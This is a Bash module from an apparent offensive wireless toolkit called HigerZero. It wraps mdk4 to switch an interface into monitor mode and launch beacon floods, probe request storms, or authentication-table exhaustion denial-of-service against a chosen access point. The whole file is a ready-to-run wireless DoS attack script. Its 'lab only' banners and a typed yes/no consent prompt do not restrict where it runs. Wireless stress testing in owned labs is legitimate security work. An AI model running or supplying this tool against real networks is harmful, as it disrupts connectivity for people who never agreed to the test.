#!/usr/bin/env bash
# HZ_NAME=Advanced Wi-Fi Beacon & Probe Stress Matrix
# HZ_DESC=Tests wireless infrastructure and client resilience against beacon flooding, probe storms, and auth-table exhaustion.
# HZ_VERSION=3.2.0
# HZ_AUTHOR=Higer23 & Advanced Cyber Lab
# HZ_CATEGORY=wireless_offensive
# HZ_REQUIRES_ROOT=yes
# HZ_REQUIRES_MONITOR=yes
# HZ_LAB_ONLY=yes

# ============================================================================
# HigerZero Module: Advanced Wi-Fi Beacon & Probe Stress Matrix
# Authorized lab-only infrastructure resilience testing via mdk4.
# ============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# 1. FRAMEWORK FALLBACKS
# ---------------------------------------------------------------------------
: "${RED:=$'\033[0;31m'}"
: "${GREEN:=$'\033[0;32m'}"
: "${YELLOW:=$'\033[1;33m'}"
: "${BLUE:=$'\033[0;34m'}"
: "${MAGENTA:=$'\033[0;35m'}"
: "${WHITE:=$'\033[1;37m'}"
: "${NC:=$'\033[0m'}"

: "${PROJECT_ROOT:=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
: "${REPORT_DIR:=${PROJECT_ROOT}/reports}"
: "${CAPTURE_DIR:=${PROJECT_ROOT}/captures}"
: "${LOG_DIR:=${PROJECT_ROOT}/logs}"
mkdir -p "$REPORT_DIR" "$CAPTURE_DIR" "$LOG_DIR"

: "${LAB_INTERFACE:=}"
: "${DEBUG:=0}"
: "${MODULE_TIMEOUT:=300}"

declare -F log_info  >/dev/null 2>&1 || log_info()  { echo -e "${GREEN}[INFO]${NC}  $*"; }
declare -F log_warn  >/dev/null 2>&1 || log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $*" >&2; }
declare -F log_error >/dev/null 2>&1 || log_error() { echo -e "${RED}[ERROR]${NC} $*" >&2; }
declare -F log_debug >/dev/null 2>&1 || log_debug() { [[ "${DEBUG}" == "1" ]] && echo -e "${BLUE}[DEBUG]${NC} $*" || true; }
declare -F print_banner >/dev/null 2>&1 || print_banner() { echo -e "${WHITE}=== HigerZero :: Beacon Flood Master ===${NC}"; }
declare -F log_event >/dev/null 2>&1 || log_event() { :; }

if ! declare -p HIGERZERO_SESSION_METRICS &>/dev/null; then
    declare -gA HIGERZERO_SESSION_METRICS=()
fi

# ---------------------------------------------------------------------------
# 2. GLOBAL STATE
# ---------------------------------------------------------------------------
declare -a MDK_CHILD_PIDS=()
declare    SPAWNED_MON_IFACE=""
declare    MONITOR_ACTIVE=0
declare    MDK_PID=""
declare    ORIGINAL_CHANNEL=""

# ---------------------------------------------------------------------------
# 3. CLEANUP — güvenli, idempotent
# ---------------------------------------------------------------------------
cleanup_beacon_ops() {
    local rc=$?
    echo -e "\n${YELLOW}[*] Terminating stress test processes and restoring interface...${NC}"

    local pid
    for pid in "${MDK_CHILD_PIDS[@]:-}"; do
        [[ -n "$pid" ]] && kill "$pid" 2>/dev/null || true
    done

    pkill -P "$$" mdk4 2>/dev/null || true

    if (( MONITOR_ACTIVE )) && [[ -n "$SPAWNED_MON_IFACE" ]]; then
        echo -e "${YELLOW}[*] Stopping monitor interface $SPAWNED_MON_IFACE...${NC}"
        airmon-ng stop "$SPAWNED_MON_IFACE" &>/dev/null || true
        if command -v systemctl >/dev/null 2>&1; then
            systemctl restart NetworkManager &>/dev/null || true
        fi
    fi

    log_event "INFO" "Beacon Flood Master cleaned up (rc=$rc)."
    return $rc
}

# ---------------------------------------------------------------------------
# 4. YARDIMCILAR
# ---------------------------------------------------------------------------
valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

valid_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 196 ))
}

is_monitor_iface() {
    iwconfig "$1" 2>/dev/null | grep -q "Mode:Monitor"
}

get_iface_channel() {
    iwconfig "$1" 2>/dev/null | grep -oE 'Channel[: ]+[0-9]+' | grep -oE '[0-9]+' | head -1
}

list_wireless_ifaces() {
    iwconfig 2>/dev/null | awk '/IEEE 802.11/ {print $1}'
}

detect_monitor_iface() {
    airmon-ng 2>/dev/null | awk '/Monitor/ {print $2; exit}'
}

set_iface_channel() {
    local iface="$1" ch="$2"
    iwconfig "$iface" channel "$ch" 2>/dev/null \
        || iw dev "$iface" set channel "$ch" 2>/dev/null \
        || return 1
}

# ---------------------------------------------------------------------------
# 5. ANA MODÜL
# ---------------------------------------------------------------------------
module_main() {
    trap cleanup_beacon_ops INT TERM

    print_banner
    echo -e "${RED}[RED TEAM MODULE]${NC} ${WHITE}Advanced Wi-Fi Beacon & Probe Stress Matrix v3.2${NC}"
    echo -e "${WHITE}Evaluates infrastructure client-handling limits. Lab/authorized testing ONLY.${NC}"
    log_event "INFO" "Initializing Beacon & Probe Stress Matrix v3.2."

    if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
        log_error "MDK4 and monitor mode operations require root (sudo)."
        log_event "ERROR" "Non-root execution blocked."
        return 1
    fi

    local missing=()
    local tool
    for tool in mdk4 airmon-ng iwconfig ip; do
        command -v "$tool" &>/dev/null || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
        log_error "Missing tools: ${missing[*]}"
        log_error "Install: sudo apt install mdk4 aircrack-ng wireless-tools iproute2"
        log_event "ERROR" "Missing dependencies: ${missing[*]}"
        return 1
    fi

    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    echo -e "${MAGENTA} AUTHORIZED USE ONLY — Generates high-density RF spectrum clutter.${NC}"
    echo -e "${MAGENTA} Only run in isolated lab environments with explicit ownership.${NC}"
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    local consent
    read -r -p "Confirm authorized lab environment usage? (yes/no): " consent
    if [[ ! "$consent" =~ ^[Yy][Ee][Ss]$ ]]; then
        log_warn "Authorization not confirmed. Aborting."
        log_event "WARN" "User did not confirm authorized use."
        return 1
    fi

    echo -e "${YELLOW}[*] Detecting wireless interfaces...${NC}"
    local ifaces
    ifaces=$(list_wireless_ifaces || true)
    [[ -n "$ifaces" ]] && echo "$ifaces" | while IFS= read -r i; do echo "    - $i"; done

    local target_iface="${LAB_INTERFACE}"
    read -r -p "Enter interface name${target_iface:+ [default: $target_iface]}: " custom_iface
    target_iface="${custom_iface:-$target_iface}"

    if [[ -z "$target_iface" ]] || ! iwconfig "$target_iface" &>/dev/null; then
        log_error "Invalid or missing interface provided."
        return 1
    fi

    # Orijinal kanalı kaydet (cleanup'ta geri dönmek için)
    ORIGINAL_CHANNEL=$(get_iface_channel "$target_iface" || true)

    if ! is_monitor_iface "$target_iface"; then
        echo -e "${YELLOW}[*] '$target_iface' is not in monitor mode.${NC}"
        local enable_mon
        read -r -p "Enable monitor mode via airmon-ng? (y/n): " enable_mon
        if [[ "$enable_mon" =~ ^[Yy]$ ]]; then
            airmon-ng check kill &>/dev/null || true
            airmon-ng start "$target_iface" &>/dev/null || true
            local new_iface
            new_iface=$(detect_monitor_iface || true)
            if [[ -n "$new_iface" ]]; then
                target_iface="$new_iface"
            else
                target_iface="${target_iface}mon"
            fi
            SPAWNED_MON_IFACE="$target_iface"
            MONITOR_ACTIVE=1
        else
            log_error "Monitor mode required. Aborting."
            return 1
        fi
    fi

    if ! is_monitor_iface "$target_iface"; then
        log_error "Failed to verify monitor mode on '$target_iface'."
        return 1
    fi

    echo -e "${GREEN}[+] Active monitor interface: ${WHITE}$target_iface${NC}"
    log_event "SUCCESS" "Monitor interface active: $target_iface"

    # --- Kanal seçimi ---
    echo -e "${YELLOW}[*] Current channel on $target_iface: ${ORIGINAL_CHANNEL:-unknown}${NC}"
    local stress_channel
    read -r -p "Stress-test channel [default: 6]: " stress_channel
    stress_channel="${stress_channel:-6}"
    if ! valid_channel "$stress_channel"; then
        log_error "Invalid channel: $stress_channel"
        return 1
    fi
    if ! set_iface_channel "$target_iface" "$stress_channel"; then
        log_warn "Could not set channel $stress_channel; continuing on current channel."
    else
        echo -e "${GREEN}[+] Locked $target_iface to channel $stress_channel${NC}"
    fi

    # --- Vector seçimi ---
    echo ""
    echo "Select Stress Matrix Attack Vector:"
    echo "  1) Beacon Flood (b)          - Spam fake AP beacons; tests client scan/UI resilience"
    echo "  2) Probe Request Storm (p)   - Massive probe requests; tests AP association handling"
    echo "  3) Auth Table Exhaustion (a) - Flood auth frames at a target AP (requires BSSID)"
    echo "  0) Cancel"
    local mdk_choice
    read -r -p "Select option (0-3): " mdk_choice
    log_event "INFO" "Beacon flood vector selected: $mdk_choice"

    local timestamp
    timestamp=$(date +%s)
    local audit_log="${CAPTURE_DIR}/beacon_stress_${timestamp}.log"
    local json_report="${REPORT_DIR}/beacon_stress_${timestamp}.json"
    HIGERZERO_SESSION_METRICS["beacon_log"]="$audit_log"
    HIGERZERO_SESSION_METRICS["beacon_report"]="$json_report"

    # --- Mod ve parametre belirleme ---
    local mdk_mode="" mode_label="" target_bssid=""
    local mdk_extra_args=()

    case "$mdk_choice" in
        1)
            # Beacon Flood — hedef AP yok, sahte beacon'lar yayınlanır
            mdk_mode="b"
            mode_label="Beacon Flood (Fake AP Clutter)"
            ;;

        2)
            # Probe Request Storm — AP'ye bağlantı denemeleri
            # mdk4 p modu: hedef BSSID OPSİYONEL (-t <BSSID> ile sınırlar)
            # Aksi halde broadcast SSID'ler için probe request gönderir
            mdk_mode="p"
            mode_label="Probe Request Storm"
            read -r -p "Target AP BSSID (optional, blank = broadcast storm): " target_bssid
            if [[ -n "$target_bssid" ]]; then
                if ! valid_mac "$target_bssid"; then
                    log_error "Invalid BSSID: $target_bssid"
                    return 1
                fi
                mdk_extra_args+=(-t "$target_bssid")
            fi
            ;;

        3)
            # Auth DoS — hedef AP BSSID ZORUNLU
            # mdk4 a modu: hedef BSSID için -a <BSSID>
            mdk_mode="a"
            mode_label="Authentication Table Exhaustion DoS"
            read -r -p "Target AP BSSID (required): " target_bssid
            if [[ -z "$target_bssid" ]]; then
                log_error "Target BSSID is mandatory for Auth DoS."
                return 1
            fi
            if ! valid_mac "$target_bssid"; then
                log_error "Invalid BSSID: $target_bssid"
                return 1
            fi
            mdk_extra_args+=(-a "$target_bssid")
            ;;

        0|"")
            log_warn "Cancelled by user."
            return 0
            ;;

        *)
            log_error "Invalid selection."
            return 1
            ;;
    esac

    # --- Süre ---
    local duration
    read -r -p "Duration in seconds (5-${MODULE_TIMEOUT}, default: 30): " duration
    duration="${duration:-30}"
    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 5 || duration > MODULE_TIMEOUT )); then
        log_error "Duration must be between 5 and ${MODULE_TIMEOUT} seconds."
        return 1
    fi

    # --- Onay ekranı ---
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}  Vector    : ${MAGENTA}$mode_label${NC}"
    echo -e "${WHITE}  Interface : ${MAGENTA}$target_iface${NC}"
    echo -e "${WHITE}  Channel   : ${MAGENTA}$stress_channel${NC}"
    echo -e "${WHITE}  Duration  : ${MAGENTA}${duration}s${NC}"
    [[ -n "$target_bssid" ]] && echo -e "${WHITE}  Target AP : ${MAGENTA}$target_bssid${NC}"
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"

    local confirm_run
    read -r -p "Execute stress test matrix? (yes/no): " confirm_run
    if [[ ! "$confirm_run" =~ ^[Yy][Ee][Ss]$ ]]; then
        log_warn "Aborted by user."
        return 0
    fi

    # --- mdk4 komutunu doğru sırada oluştur ---
    # Sözdizimi: mdk4 <iface> <mode> [mode-specific args]
    # Örn:      mdk4 wlan0mon p -t AA:BB:CC:DD:EE:FF
    #           mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF
    local mdk_cmd=(mdk4 "$target_iface" "$mdk_mode")
    mdk_cmd+=("${mdk_extra_args[@]}")

    log_debug "mdk4 command: ${mdk_cmd[*]}"

    echo -e "${GREEN}[+] Launching mdk4 (mode=$mdk_mode) for ${duration}s...${NC}"
    log_event "SUCCESS" "Starting mdk4 mode '$mdk_mode' on $target_iface for ${duration}s."

    # --- Başlatma ve doğrulama ---
    : > "$audit_log"   # log dosyasını temizle
    "${mdk_cmd[@]}" > "$audit_log" 2>&1 &
    MDK_PID=$!
    MDK_CHILD_PIDS+=("$MDK_PID")

    # mdk4'nün gerçekten ayakta olduğunu doğrula
    sleep 2
    if ! kill -0 "$MDK_PID" 2>/dev/null; then
        log_error "mdk4 failed to start. Check log: $audit_log"
        tail -10 "$audit_log" >&2 || true
        log_event "ERROR" "mdk4 failed to start."
        return 1
    fi
    echo -e "${GREEN}[+] mdk4 running (PID $MDK_PID).${NC}"

    # --- Sabit süreli bekleme (drift olmadan) ---
    local start_ts end_ts elapsed
    start_ts=$(date +%s)
    end_ts=$(( start_ts + duration ))

    # Kullanıcı ilerlemeyi görebilsin diye her 5 saniyede bir nokta
    local next_report=$(( start_ts + 5 ))
    while (( $(date +%s) < end_ts )); do
        if ! kill -0 "$MDK_PID" 2>/dev/null; then
            echo -e "${YELLOW}[!] mdk4 exited prematurely.${NC}"
            break
        fi
        if (( $(date +%s) >= next_report )); then
            echo -ne "${YELLOW}.${NC}"
            next_report=$(( next_report + 5 ))
        fi
        sleep 0.5
    done
    echo ""

    elapsed=$(( $(date +%s) - start_ts ))

    # --- Nazikçe durdur ---
    if kill -0 "$MDK_PID" 2>/dev/null; then
        kill -TERM "$MDK_PID" 2>/dev/null || true
        sleep 1
        kill -KILL "$MDK_PID" 2>/dev/null || true
    fi
    wait "$MDK_PID" 2>/dev/null || true

    echo -e "${GREEN}[+] Stress test matrix completed (elapsed: ${elapsed}s).${NC}"
    echo -e "${YELLOW}[*] Log size: $(du -h "$audit_log" 2>/dev/null | cut -f1 || echo '?')${NC}"

    # --- JSON Rapor ---
    if command -v jq >/dev/null 2>&1; then
        jq -n \
            --arg ts "$timestamp" \
            --arg iface "$target_iface" \
            --arg mode "$mode_label" \
            --arg mdk_mode "$mdk_mode" \
            --argjson dur "$elapsed" \
            --arg target "${target_bssid:-none}" \
            --arg ch "$stress_channel" \
            --arg raw_log "$audit_log" \
            '{
                timestamp: $ts,
                interface: $iface,
                mode: $mode,
                mdk4_mode: $mdk_mode,
                target_bssid: $target,
                channel: $ch,
                duration_seconds: $dur,
                status: "completed",
                raw_log: $raw_log
            }' > "$json_report"
    else
        cat > "$json_report" <<EOF
{
  "timestamp": "$timestamp",
  "interface": "$target_iface",
  "mode": "$mode_label",
  "mdk4_mode": "$mdk_mode",
  "target_bssid": "${target_bssid:-none}",
  "channel": "$stress_channel",
  "duration_seconds": $elapsed,
  "status": "completed",
  "raw_log": "$audit_log"
}
EOF
    fi

    # --- Kanalı geri yükle (opsiyonel) ---
    if [[ -n "$ORIGINAL_CHANNEL" ]] && valid_channel "$ORIGINAL_CHANNEL"; then
        set_iface_channel "$target_iface" "$ORIGINAL_CHANNEL" 2>/dev/null || true
    fi

    echo -e "${GREEN}[+] Audit log   :${NC} $audit_log"
    echo -e "${GREEN}[+] JSON report :${NC} $json_report"
    log_event "SUCCESS" "Beacon & Probe Stress Matrix finished successfully."

    return 0
}

# ---------------------------------------------------------------------------
# 6. LIFECYCLE HOOKS
# ---------------------------------------------------------------------------
module_init()    { log_debug "beacon_flood: init"; }
module_cleanup() { log_debug "beacon_flood: cleanup"; }

export -f module_init module_main module_cleanup 2>/dev/null || true

# ---------------------------------------------------------------------------
# 7. DOĞRUDAN ÇALIŞTIRMA
# ---------------------------------------------------------------------------
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    module_main "$@"
fi
